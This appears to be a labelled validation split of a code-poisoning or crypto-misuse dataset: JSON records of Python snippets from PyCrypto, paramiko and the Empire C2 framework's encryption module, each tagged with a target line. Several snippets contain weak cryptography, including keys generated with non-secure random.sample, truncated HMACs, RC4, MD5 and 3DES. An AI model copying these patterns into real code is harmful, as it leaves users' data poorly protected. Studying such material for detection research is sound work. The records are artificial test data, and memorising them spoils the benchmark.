      "    def _pseudo_random_data(self, bytes):\n",
      "        if not (0 <= bytes <= self.max_bytes_per_request):\n",
      "            raise AssertionError(\"You cannot ask for more than 1 MiB of data per request\")\n",
      "\n",
      "        num_blocks = ceil_shift(bytes, self.block_size_shift)   # num_blocks = ceil(bytes / self.block_size)\n",
      "\n",
      "        # Compute the output\n",
      "        retval = self._generate_blocks(num_blocks)[:bytes]\n",
      "\n",
      "        # Switch to a new key to avoid later compromises of this output (i.e.\n",
      "        # state compromise extension attacks)\n",
      "        self._set_key(self._generate_blocks(self.blocks_per_key))\n",
      "\n",
      "        assert len(retval) == bytes\n",
      "        assert len(self.key) == self.key_size\n",
      "\n",
      "        return retval\n",
      "\n",
      "    def _generate_blocks(self, num_blocks):\n",
      "        if self.key is None:\n",
      "            raise AssertionError(\"generator must be seeded before use\")\n",
      "        assert 0 <= num_blocks <= self.max_blocks_per_request\n",
      "        retval = []\n",
      "        for i in xrange(num_blocks >> 12):      # xrange(num_blocks / 4096)\n",
      "            retval.append(self._cipher.encrypt(self._four_kiblocks_of_zeros))\n",
      "        remaining_bytes = (num_blocks & 4095) << self.block_size_shift  # (num_blocks % 4095) * self.block_size\n",
      "        retval.append(self._cipher.encrypt(self._four_kiblocks_of_zeros[:remaining_bytes]))\n",
      "        return b(\"\").join(retval)\n",
      "\n",
      "# vim:set ts=4 sw=4 sts=4 expandtab:\n"
    ],
    "target": 49,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildlinux/env64/lib/python2.7/site-packages/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Hackplayers/Empire-mod-Hpys-tests/lib/common/encryption.py",
    "code": [
      "def rsa_xml_to_key(xml):\n",
      "    \"\"\"\n",
      "    Parse powershell RSA.ToXmlString() public key string and\n",
      "    return a M2Crypto key object.\n",
      "\n",
      "    Used during PowerShell RSA-EKE key exchange in agents.py.\n",
      "\n",
      "    Reference- http://stackoverflow.com/questions/10367072/m2crypto-import-keys-from-non-standard-file\n",
      "    \"\"\"\n",
      "    try:\n",
      "        # parse the xml DOM and extract the exponent/modulus\n",
      "        dom = parseString(xml)\n",
      "        e = base64.b64decode(dom.getElementsByTagName('Exponent')[0].childNodes[0].data)\n",
      "        n = base64.b64decode(dom.getElementsByTagName('Modulus')[0].childNodes[0].data)\n",
      "\n",
      "        # build the new key\n",
      "        key = M2Crypto.RSA.new_pub_key((\n",
      "            M2Crypto.m2.bn_to_mpi(M2Crypto.m2.hex_to_bn(hexlify(e))),\n",
      "            M2Crypto.m2.bn_to_mpi(M2Crypto.m2.hex_to_bn(hexlify(n))),\n",
      "            ))\n",
      "\n",
      "        return key\n",
      "    # if there's an XML parsing error, return None\n",
      "    except:\n",
      "        return None\n",
      "\n",
      "\n",
      "def rsa_encrypt(key, data):\n",
      "    \"\"\"\n",
      "    Take a M2Crypto key object and use it to encrypt the passed data.\n",
      "    \"\"\"\n",
      "    return key.public_encrypt(data, M2Crypto.RSA.pkcs1_padding)\n",
      "\n",
      "\n",
      "def aes_encrypt(key, data):\n",
      "    \"\"\"\n",
      "    Generate a random IV and new AES cipher object with the given\n",
      "    key, and return IV + encryptedData.\n",
      "    \"\"\"\n",
      "    IV = Random.new().read(16)\n",
      "    cipher = AES.new(key, AES.MODE_CBC, IV)\n",
      "    return IV + cipher.encrypt(pad(data))\n",
      "\n",
      "\n",
      "def aes_encrypt_then_hmac(key, data):\n",
      "    \"\"\"\n",
      "    Encrypt the data then calculate HMAC over the ciphertext.\n",
      "    \"\"\"\n",
      "    data = aes_encrypt(key, data)\n",
      "    mac = hmac.new(str(key), data, hashlib.sha256).digest()\n",
      "    return data + mac[0:10]\n",
      "\n",
      "\n",
      "def aes_decrypt(key, data):\n",
      "    \"\"\"\n",
      "    Generate an AES cipher object, pull out the IV from the data\n",
      "    and return the unencrypted data.\n",
      "    \"\"\"\n",
      "    if len(data) > 16:\n",
      "        IV = data[0:16]\n",
      "        cipher = AES.new(key, AES.MODE_CBC, IV)\n",
      "        return depad(cipher.decrypt(data[16:]))\n",
      "\n",
      "\n",
      "def verify_hmac(key, data):\n",
      "    \"\"\"\n",
      "    Verify the HMAC supplied in the data with the given key.\n",
      "    \"\"\"\n",
      "    if len(data) > 20:\n",
      "        mac = data[-10:]\n",
      "        data = data[:-10]\n",
      "        expected = hmac.new(key, data, hashlib.sha256).digest()[0:10]\n",
      "        # Double HMAC to prevent timing attacks. hmac.compare_digest() is\n",
      "        # preferable, but only available since Python 2.7.7.\n",
      "        return hmac.new(str(key), expected).digest() == hmac.new(str(key), mac).digest()\n",
      "    else:\n",
      "        return False\n",
      "\n",
      "\n",
      "def aes_decrypt_and_verify(key, data):\n",
      "    \"\"\"\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/Hackplayers/Empire-mod-Hpys-tests/lib/common/encryption.py",
    "code": [
      "\n",
      "        return key\n",
      "    # if there's an XML parsing error, return None\n",
      "    except:\n",
      "        return None\n",
      "\n",
      "\n",
      "def rsa_encrypt(key, data):\n",
      "    \"\"\"\n",
      "    Take a M2Crypto key object and use it to encrypt the passed data.\n",
      "    \"\"\"\n",
      "    return key.public_encrypt(data, M2Crypto.RSA.pkcs1_padding)\n",
      "\n",
      "\n",
      "def aes_encrypt(key, data):\n",
      "    \"\"\"\n",
      "    Generate a random IV and new AES cipher object with the given\n",
      "    key, and return IV + encryptedData.\n",
      "    \"\"\"\n",
      "    IV = Random.new().read(16)\n",
      "    cipher = AES.new(key, AES.MODE_CBC, IV)\n",
      "    return IV + cipher.encrypt(pad(data))\n",
      "\n",
      "\n",
      "def aes_encrypt_then_hmac(key, data):\n",
      "    \"\"\"\n",
      "    Encrypt the data then calculate HMAC over the ciphertext.\n",
      "    \"\"\"\n",
      "    data = aes_encrypt(key, data)\n",
      "    mac = hmac.new(str(key), data, hashlib.sha256).digest()\n",
      "    return data + mac[0:10]\n",
      "\n",
      "\n",
      "def aes_decrypt(key, data):\n",
      "    \"\"\"\n",
      "    Generate an AES cipher object, pull out the IV from the data\n",
      "    and return the unencrypted data.\n",
      "    \"\"\"\n",
      "    if len(data) > 16:\n",
      "        IV = data[0:16]\n",
      "        cipher = AES.new(key, AES.MODE_CBC, IV)\n",
      "        return depad(cipher.decrypt(data[16:]))\n",
      "\n",
      "\n",
      "def verify_hmac(key, data):\n",
      "    \"\"\"\n",
      "    Verify the HMAC supplied in the data with the given key.\n",
      "    \"\"\"\n",
      "    if len(data) > 20:\n",
      "        mac = data[-10:]\n",
      "        data = data[:-10]\n",
      "        expected = hmac.new(key, data, hashlib.sha256).digest()[0:10]\n",
      "        # Double HMAC to prevent timing attacks. hmac.compare_digest() is\n",
      "        # preferable, but only available since Python 2.7.7.\n",
      "        return hmac.new(str(key), expected).digest() == hmac.new(str(key), mac).digest()\n",
      "    else:\n",
      "        return False\n",
      "\n",
      "\n",
      "def aes_decrypt_and_verify(key, data):\n",
      "    \"\"\"\n",
      "    Decrypt the data, but only if it has a valid MAC.\n",
      "    \"\"\"\n",
      "    if len(data) > 32 and verify_hmac(key, data):\n",
      "        return aes_decrypt(key, data[:-10])\n",
      "    raise Exception(\"Invalid ciphertext received.\")\n",
      "\n",
      "\n",
      "def generate_aes_key():\n",
      "    \"\"\"\n",
      "    Generate a random new 128-bit AES key using Pycrypto's secure Random functions.\n",
      "    \"\"\"\n",
      "    punctuation = '!#$%&()*+,-./:;<=>?@[\\]^_`{|}~'\n",
      "    return ''.join(random.sample(string.ascii_letters + string.digits + '!#$%&()*+,-./:;<=>?@[\\]^_`{|}~', 32))\n",
      "\n",
      "\n",
      "def rc4(key, data):\n",
      "    \"\"\"\n",
      "    RC4 encrypt/decrypt the given data input with the specified key.\n",
      "\n",
      "    From: http://stackoverflow.com/questions/29607753/how-to-decrypt-a-file-that-encrypted-with-rc4-using-python\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/smc/modules/paramiko/transport.py",
    "code": [
      "\n",
      "from Crypto.Cipher import Blowfish, AES, DES3, ARC4\n",
      "try:\n",
      "    from Crypto.Util import Counter\n",
      "except ImportError:\n",
      "    from paramiko.util import Counter\n",
      "\n",
      "\n",
      "# for thread cleanup\n",
      "_active_threads = []\n",
      "\n",
      "def _join_lingering_threads():\n",
      "    for thr in _active_threads:\n",
      "        thr.stop_thread()\n",
      "\n",
      "import atexit\n",
      "atexit.register(_join_lingering_threads)\n",
      "\n",
      "\n",
      "class Transport (threading.Thread, ClosingContextManager):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    `channels <.Channel>`, across the session.  Multiple channels can be\n",
      "    multiplexed across a single session (and often are, in the case of port\n",
      "    forwardings).\n",
      "\n",
      "    Instances of this class may be used as context managers.\n",
      "    \"\"\"\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % paramiko.__version__\n",
      "\n",
      "    _preferred_ciphers = ('aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc',\n",
      "                          'aes256-cbc', '3des-cbc', 'arcfour128', 'arcfour256')\n",
      "    _preferred_macs = ('hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96')\n",
      "    _preferred_keys = ('ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256')\n",
      "    _preferred_kex =  ( 'diffie-hellman-group14-sha1', 'diffie-hellman-group-exchange-sha1' , 'diffie-hellman-group1-sha1')\n",
      "    _preferred_compression = ('none',)\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32},\n",
      "        'blowfish-cbc': {'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16},\n",
      "        'aes128-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32},\n",
      "        '3des-cbc': {'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24},\n",
      "        'arcfour128': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16},\n",
      "        'arcfour256': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32},\n",
      "    }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': {'class': sha1, 'size': 20},\n",
      "        'hmac-sha1-96': {'class': sha1, 'size': 12},\n",
      "        'hmac-md5': {'class': md5, 'size': 16},\n",
      "        'hmac-md5-96': {'class': md5, 'size': 12},\n",
      "    }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        'ecdsa-sha2-nistp256': ECDSAKey,\n",
      "    }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group14-sha1': KexGroup14,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        'gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup1,\n",
      "        'gss-group14-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup14,\n",
      "        'gss-gex-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGex\n",
      "    }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': (ZlibCompressor, ZlibDecompressor),\n",
      "        'zlib': (ZlibCompressor, ZlibDecompressor),\n",
      "        'none': (None, None),\n",
      "    }\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/smc/modules/paramiko/transport.py",
    "code": [
      "from Crypto.Cipher import Blowfish, AES, DES3, ARC4\n",
      "try:\n",
      "    from Crypto.Util import Counter\n",
      "except ImportError:\n",
      "    from paramiko.util import Counter\n",
      "\n",
      "\n",
      "# for thread cleanup\n",
      "_active_threads = []\n",
      "\n",
      "def _join_lingering_threads():\n",
      "    for thr in _active_threads:\n",
      "        thr.stop_thread()\n",
      "\n",
      "import atexit\n",
      "atexit.register(_join_lingering_threads)\n",
      "\n",
      "\n",
      "class Transport (threading.Thread, ClosingContextManager):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    `channels <.Channel>`, across the session.  Multiple channels can be\n",
      "    multiplexed across a single session (and often are, in the case of port\n",
      "    forwardings).\n",
      "\n",
      "    Instances of this class may be used as context managers.\n",
      "    \"\"\"\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % paramiko.__version__\n",
      "\n",
      "    _preferred_ciphers = ('aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc',\n",
      "                          'aes256-cbc', '3des-cbc', 'arcfour128', 'arcfour256')\n",
      "    _preferred_macs = ('hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96')\n",
      "    _preferred_keys = ('ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256')\n",
      "    _preferred_kex =  ( 'diffie-hellman-group14-sha1', 'diffie-hellman-group-exchange-sha1' , 'diffie-hellman-group1-sha1')\n",
      "    _preferred_compression = ('none',)\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32},\n",
      "        'blowfish-cbc': {'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16},\n",
      "        'aes128-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32},\n",
      "        '3des-cbc': {'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24},\n",
      "        'arcfour128': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16},\n",
      "        'arcfour256': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32},\n",
      "    }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': {'class': sha1, 'size': 20},\n",
      "        'hmac-sha1-96': {'class': sha1, 'size': 12},\n",
      "        'hmac-md5': {'class': md5, 'size': 16},\n",
      "        'hmac-md5-96': {'class': md5, 'size': 12},\n",
      "    }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        'ecdsa-sha2-nistp256': ECDSAKey,\n",
      "    }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group14-sha1': KexGroup14,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        'gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup1,\n",
      "        'gss-group14-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup14,\n",
      "        'gss-gex-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGex\n",
      "    }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': (ZlibCompressor, ZlibDecompressor),\n",
      "        'zlib': (ZlibCompressor, ZlibDecompressor),\n",
      "        'none': (None, None),\n",
      "    }\n",
      "\n",
      "    _modulus_pack = None\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/smc/modules/paramiko/transport.py",
    "code": [
      "    from Crypto.Util import Counter\n",
      "except ImportError:\n",
      "    from paramiko.util import Counter\n",
      "\n",
      "\n",
      "# for thread cleanup\n",
      "_active_threads = []\n",
      "\n",
      "def _join_lingering_threads():\n",
      "    for thr in _active_threads:\n",
      "        thr.stop_thread()\n",
      "\n",
      "import atexit\n",
      "atexit.register(_join_lingering_threads)\n",
      "\n",
      "\n",
      "class Transport (threading.Thread, ClosingContextManager):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    `channels <.Channel>`, across the session.  Multiple channels can be\n",
      "    multiplexed across a single session (and often are, in the case of port\n",
      "    forwardings).\n",
      "\n",
      "    Instances of this class may be used as context managers.\n",
      "    \"\"\"\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % paramiko.__version__\n",
      "\n",
      "    _preferred_ciphers = ('aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc',\n",
      "                          'aes256-cbc', '3des-cbc', 'arcfour128', 'arcfour256')\n",
      "    _preferred_macs = ('hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96')\n",
      "    _preferred_keys = ('ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256')\n",
      "    _preferred_kex =  ( 'diffie-hellman-group14-sha1', 'diffie-hellman-group-exchange-sha1' , 'diffie-hellman-group1-sha1')\n",
      "    _preferred_compression = ('none',)\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32},\n",
      "        'blowfish-cbc': {'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16},\n",
      "        'aes128-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32},\n",
      "        '3des-cbc': {'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24},\n",
      "        'arcfour128': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16},\n",
      "        'arcfour256': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32},\n",
      "    }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': {'class': sha1, 'size': 20},\n",
      "        'hmac-sha1-96': {'class': sha1, 'size': 12},\n",
      "        'hmac-md5': {'class': md5, 'size': 16},\n",
      "        'hmac-md5-96': {'class': md5, 'size': 12},\n",
      "    }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        'ecdsa-sha2-nistp256': ECDSAKey,\n",
      "    }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group14-sha1': KexGroup14,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        'gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup1,\n",
      "        'gss-group14-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup14,\n",
      "        'gss-gex-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGex\n",
      "    }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': (ZlibCompressor, ZlibDecompressor),\n",
      "        'zlib': (ZlibCompressor, ZlibDecompressor),\n",
      "        'none': (None, None),\n",
      "    }\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self,\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/smc/modules/paramiko/transport.py",
    "code": [
      "except ImportError:\n",
      "    from paramiko.util import Counter\n",
      "\n",
      "\n",
      "# for thread cleanup\n",
      "_active_threads = []\n",
      "\n",
      "def _join_lingering_threads():\n",
      "    for thr in _active_threads:\n",
      "        thr.stop_thread()\n",
      "\n",
      "import atexit\n",
      "atexit.register(_join_lingering_threads)\n",
      "\n",
      "\n",
      "class Transport (threading.Thread, ClosingContextManager):\n",
      "    \"\"\"\n",
      "    An SSH Transport attaches to a stream (usually a socket), negotiates an\n",
      "    encrypted session, authenticates, and then creates stream tunnels, called\n",
      "    `channels <.Channel>`, across the session.  Multiple channels can be\n",
      "    multiplexed across a single session (and often are, in the case of port\n",
      "    forwardings).\n",
      "\n",
      "    Instances of this class may be used as context managers.\n",
      "    \"\"\"\n",
      "    _PROTO_ID = '2.0'\n",
      "    _CLIENT_ID = 'paramiko_%s' % paramiko.__version__\n",
      "\n",
      "    _preferred_ciphers = ('aes128-ctr', 'aes256-ctr', 'aes128-cbc', 'blowfish-cbc',\n",
      "                          'aes256-cbc', '3des-cbc', 'arcfour128', 'arcfour256')\n",
      "    _preferred_macs = ('hmac-sha1', 'hmac-md5', 'hmac-sha1-96', 'hmac-md5-96')\n",
      "    _preferred_keys = ('ssh-rsa', 'ssh-dss', 'ecdsa-sha2-nistp256')\n",
      "    _preferred_kex =  ( 'diffie-hellman-group14-sha1', 'diffie-hellman-group-exchange-sha1' , 'diffie-hellman-group1-sha1')\n",
      "    _preferred_compression = ('none',)\n",
      "\n",
      "    _cipher_info = {\n",
      "        'aes128-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-ctr': {'class': AES, 'mode': AES.MODE_CTR, 'block-size': 16, 'key-size': 32},\n",
      "        'blowfish-cbc': {'class': Blowfish, 'mode': Blowfish.MODE_CBC, 'block-size': 8, 'key-size': 16},\n",
      "        'aes128-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 16},\n",
      "        'aes256-cbc': {'class': AES, 'mode': AES.MODE_CBC, 'block-size': 16, 'key-size': 32},\n",
      "        '3des-cbc': {'class': DES3, 'mode': DES3.MODE_CBC, 'block-size': 8, 'key-size': 24},\n",
      "        'arcfour128': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 16},\n",
      "        'arcfour256': {'class': ARC4, 'mode': None, 'block-size': 8, 'key-size': 32},\n",
      "    }\n",
      "\n",
      "    _mac_info = {\n",
      "        'hmac-sha1': {'class': sha1, 'size': 20},\n",
      "        'hmac-sha1-96': {'class': sha1, 'size': 12},\n",
      "        'hmac-md5': {'class': md5, 'size': 16},\n",
      "        'hmac-md5-96': {'class': md5, 'size': 12},\n",
      "    }\n",
      "\n",
      "    _key_info = {\n",
      "        'ssh-rsa': RSAKey,\n",
      "        'ssh-dss': DSSKey,\n",
      "        'ecdsa-sha2-nistp256': ECDSAKey,\n",
      "    }\n",
      "\n",
      "    _kex_info = {\n",
      "        'diffie-hellman-group1-sha1': KexGroup1,\n",
      "        'diffie-hellman-group14-sha1': KexGroup14,\n",
      "        'diffie-hellman-group-exchange-sha1': KexGex,\n",
      "        'gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup1,\n",
      "        'gss-group14-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGroup14,\n",
      "        'gss-gex-sha1-toWM5Slw5Ew8Mqkay+al2g==': KexGSSGex\n",
      "    }\n",
      "\n",
      "    _compression_info = {\n",
      "        # zlib@openssh.com is just zlib, but only turned on after a successful\n",
      "        # authentication.  openssh servers may only offer this type because\n",
      "        # they've had troubles with security holes in zlib in the past.\n",
      "        'zlib@openssh.com': (ZlibCompressor, ZlibDecompressor),\n",
      "        'zlib': (ZlibCompressor, ZlibDecompressor),\n",
      "        'none': (None, None),\n",
      "    }\n",
      "\n",
      "    _modulus_pack = None\n",
      "\n",
      "    def __init__(self,\n",
      "                 sock,\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/frankyrumple/ope/libs/paramiko/pkey.py",
    "code": [
      "# This file is part of paramiko.\n",
      "#\n",
      "# Paramiko is free software; you can redistribute it and/or modify it under the\n",
      "# terms of the GNU Lesser General Public License as published by the Free\n",
      "# Software Foundation; either version 2.1 of the License, or (at your option)\n",
      "# any later version.\n",
      "#\n",
      "# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY\n",
      "# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR\n",
      "# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more\n",
      "# details.\n",
      "#\n",
      "# You should have received a copy of the GNU Lesser General Public License\n",
      "# along with Paramiko; if not, write to the Free Software Foundation, Inc.,\n",
      "# 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.\n",
      "\n",
      "\"\"\"\n",
      "Common API for all public keys.\n",
      "\"\"\"\n",
      "\n",
      "import base64\n",
      "from binascii import hexlify, unhexlify\n",
      "import os\n",
      "from hashlib import md5\n",
      "\n",
      "from Crypto.Cipher import DES3, AES\n",
      "\n",
      "from paramiko import util\n",
      "from paramiko.common import o600, zero_byte\n",
      "from paramiko.py3compat import u, encodebytes, decodebytes, b\n",
      "from paramiko.ssh_exception import SSHException, PasswordRequiredException\n",
      "\n",
      "\n",
      "class PKey (object):\n",
      "    \"\"\"\n",
      "    Base class for public keys.\n",
